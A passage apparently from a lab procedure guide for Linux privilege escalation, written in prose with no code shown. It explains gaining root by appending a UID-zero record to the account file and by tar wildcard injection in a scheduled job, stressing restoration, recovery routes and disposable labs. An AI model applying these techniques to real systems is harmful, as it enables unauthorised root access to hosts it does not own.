documents standard append/output semantics. It does not establish that a renamed
or custom installed utility is GNU tee. Keep the installed-behavior prerequisite.

DC-9's neighboring source explains a two-file append; the later account record
and successful `su` establish the exercised transition. Neither explains the
missing restoration. This procedure keeps the source-matched append, then adds
independent original custody, exact expected-byte verification and root-side
restoration. It does not claim a neighboring source file authenticates a frozen
binary or that DC-4's stdin append tool has identical arguments.

The account file has seven fields. UID zero is privilege, and an inline password
hash does not imply changing the original root password. Actual PAM/NSS and
password-format support decide whether this temporary account can authenticate;
that is why denied login requires the **pre-existing** recovery route. See
[Linux account-file fields](https://man7.org/linux/man-pages/man5/passwd.5.html)
and [OpenSSL password hashing](https://docs.openssl.org/3.3/man1/openssl-passwd/).

The helper does not call sudo, su, append a record, create a home, lock out other
accounts or delete recovery files. Restore requires an already verified native
UID-zero context and only accepts the exact prepared append. It preserves the
existing inode, mode, ownership and xattrs by restoring bytes in place; file
timestamps and login history are not restored. It is not an account-database
transaction lock or a substitute for a quiet disposable lab and tested fallback.
Do not use it while another account manager can change the file. Root within a
namespace or an already-open process needs separate native boundary checks.
`-I` also prevents a neighboring `json.py` or Python environment override from
becoming code in the recovery process. The CLI refuses non-isolated launch
before its non-builtin imports, but cannot retroactively protect Python startup;
use the isolated invocation, not a failed ordinary launch as a safety check.

## LPRIV-15. Shell wildcard expansion creates tar options before tar starts

The scheduled shell expands `*` before GNU tar parses its arguments. Filenames
beginning with `--` can therefore become options only when the job runs from the
same writable directory and passes the unquoted wildcard. A recursive path,
quoted literal, explicit `--` separator, non-GNU tar or different working
directory breaks this procedure's prerequisites.

The proof script records the job's effective identity without opening a shell.
Its result still needs trigger-time and host attribution. Remove the option-like
filenames after the check because leaving them in the consumed directory can
repeat the action at every scheduled run.
